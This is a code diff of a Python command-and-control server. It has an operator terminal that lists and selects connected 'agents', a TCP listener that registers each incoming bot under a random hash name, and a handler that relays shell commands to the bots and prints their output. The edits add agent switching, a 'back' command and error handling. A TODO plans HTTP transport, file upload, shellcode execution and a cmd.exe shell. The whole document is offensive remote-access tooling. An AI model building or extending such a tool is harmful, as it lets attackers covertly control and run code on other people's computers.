@@ -22,15 +22,19 @@ import inspect
 #       enter this queue into Global dict
 #  Client Thread - as now
 
-def main():
 
-    # starts Terminal [that's all?]
+# TODO:
+#   - verification if agent is alive?
+#   - help messages of Cmd
+#   - add HTTP transport
+#   - use commands (getpid, upload file, exec shellcode) and cmd.exe only if 'shell' entered
+
+def main():
     terminal = Terminal(Listeners,ClientDict)
     terminal.cmdloop()
 
 
 class Terminal(Cmd):
-    prompt = '$ '
     def __init__(self,Listeners,ClientDict):
         Cmd.__init__(self)
         self.lport = 8008
@@ -38,6 +42,9 @@ class Terminal(Cmd):
         self.listeners = Listeners
         self.q = None
         self.ClientDict = ClientDict
+        self.agent = ''
+        self.prompt = '$ '
+    
 
     def do_exit(self,args):
         time.sleep(0.5)
@@ -55,6 +62,9 @@ class Terminal(Cmd):
                         if 'tcp' in self.listeners[i][0]:
                             tcp_listener = self.listeners[i][1](self.lhost,self.lport)
                             tcp_listener.start()
+            else:
+                print("[-] No such start option.")
+                self.help_start()
 
     def help_start(self):
         print("todo help start")
@@ -104,11 +114,10 @@ class Terminal(Cmd):
 
     def emptyline(self):
         if self.q == None:
-            print("[-] You need to choose agent.")
-            self.help_interact()
+            pass
         else:
             self.q.put("\n")
-        time.sleep(0.5) # To not input prompt before response
+            time.sleep(1) # To not input prompt before response
     
     def default(self, args):
         if self.q == None:
@@ -116,17 +125,27 @@ class Terminal(Cmd):
             self.help_interact()
         else:
             self.q.put(args+"\n")
-        time.sleep(0.5) # To not input prompt before response
+        time.sleep(1) # To not input prompt before response
 
     def do_interact(self,args):
         if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
             self.help_list()
         else:
-            agent = args
-            self.q = ClientDict[agent][1]
+            self.agent = args
+            try:
+                self.q = ClientDict[self.agent][1]
+                self.prompt = '{} $ '.format(self.ClientDict[self.agent][0][0])
+            except KeyError:
+                print("[-] No such agent. Use: 'list agents'")
+            except Exception as ex:
+                print("[-] Unhandled exception: {}".format(ex))
 
     def help_interact(self):
         print("todo help interact")
+    
+    def do_back(self,args):
+        self.q = None
+        self.prompt = '$ '
 
 
 class listener_tcp(threading.Thread):
@@ -150,13 +169,13 @@ class listener_tcp(threading.Thread):
             # Any agent connection goes in BotHandler threading class.
             newthread = BotHandler(client, client_address, q)
             
-            print("\n[DBG] Adding new agent to agent list...")
+            #print("\n[DBG] Adding new agent to agent list...")
             randName = hashlib.sha1(hex(random.randrange(100000,200000)).split('0x')[1].encode('utf-8')).hexdigest()
             newthread.setName(str(randName))
             newthread.start()
             
             ClientDict[randName] = (client_address, q)
-            print("[DBG] Added. Agent list now: {}".format(ClientDict))
+            #print("[DBG] Added. Agent list now: {}".format(ClientDict))
 
 
 class BotHandler(threading.Thread):
@@ -228,7 +247,7 @@ class BotHandler(threading.Thread):
                 print(cmd_response.replace(RecvBotCmd,""))
             
             except Exception as ex:
-                print("Exception occured during command sending: {}".format(ex))
+                print("[-] Exception occured during command sending: {}".format(ex))
                 break
 
 
